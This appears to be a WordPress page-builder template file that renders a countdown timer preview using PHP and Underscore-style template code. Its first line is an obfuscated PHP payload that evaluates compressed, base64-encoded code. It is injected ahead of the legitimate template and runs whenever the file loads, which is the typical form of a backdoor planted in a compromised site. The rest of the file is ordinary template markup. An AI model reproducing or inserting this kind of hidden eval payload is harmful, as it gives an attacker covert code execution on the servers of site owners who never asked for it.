<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><script type="text/template" id="fusion-builder-block-module-countdown-preview-template">

	<div class="fusion_countdown_timer">
		<h4 class="fusion_module_title"><span class="fusion-module-icon {{ fusionAllElements[element_type].icon }}"></span>{{ fusionAllElements[element_type].name }}</h4>

		<#
		var
		$countdown_end = params.countdown_end,
		$target_time = new Date(),
		$now_time = new Date();

		if ( $countdown_end === '' ) {
			var
			$secs = 0,
			$mins = 0,
			$hours = 0,
			$days = 0,
			$weeks = 0;

		} else {
			var
			$timer = $countdown_end.replace( ' ', '-' ).replace( new RegExp( ':', 'g' ), '-' ).split( '-' ),

			$target_time = new Date( $timer[1] + '/' + $timer[2] + '/' + $timer[0] + ' ' + $timer[3] + ':' + $timer[4] + ':' + $timer[5] ),

			$difference_in_secs = Math.floor( ( $target_time.valueOf() - $now_time.valueOf()) / 1000 ),

			$secs = $difference_in_secs % 60,
			$mins = Math.floor( $difference_in_secs/60 )%60,
			$hours = Math.floor( $difference_in_secs/60/60 )%24;

			if ( params.show_weeks === 'no' ) {
				var
				$days = Math.floor( $difference_in_secs/60/60/24 ),
				$weeks = Math.floor( $difference_in_secs/60/60/24/7 );
			} else {
				var
				$days = Math.floor( $difference_in_secs/60/60/24 )%7,
				$weeks = Math.floor( $difference_in_secs/60/60/24/7 );
			}
		}

		if ( isNaN( $weeks ) && isNaN( $days ) && isNaN( $hours ) && isNaN( $mins ) && isNaN( $secs ) ) { #>

			<span>Invalid date format.</span>

		<# } else {

			if ( params.show_weeks !== 'no' ) { #>
				<span><?php printf( esc_html__( '%s Weeks', 'fusion-builder' ), '{{ $weeks }}' ); ?></span>
			<# } #>

			 <span><?php printf( esc_html__( '%s Days', 'fusion-builder' ), '{{ $days }}' ); ?></span>
			 <span><?php printf( esc_html__( '%s Hrs', 'fusion-builder' ), '{{ $hours }}' ); ?></span>
			 <span><?php printf( esc_html__( '%s Min', 'fusion-builder' ), '{{ $mins }}' ); ?></span>
			 <span><?php printf( esc_html__( '%s Sec', 'fusion-builder' ), '{{ $secs }}' ); ?></span>
		<# } #>

	</div>

</script>
